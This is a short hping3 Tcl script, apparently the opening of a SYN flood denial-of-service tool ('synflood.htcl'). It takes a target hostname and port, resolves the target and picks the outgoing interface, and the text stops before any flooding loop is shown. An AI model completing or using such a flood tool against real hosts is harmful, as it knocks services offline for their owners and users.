# Usage; hping3 exec ./synflood.htcl <hostname> <dstport>

if {$argc < 2} {
puts "Required arguments: hostname dstport"
exit 1
}

foreach {hostname port} $argv break
set srcport 14000
set target [hping resolve $hostname]
set myaddr [hping outifa $target]
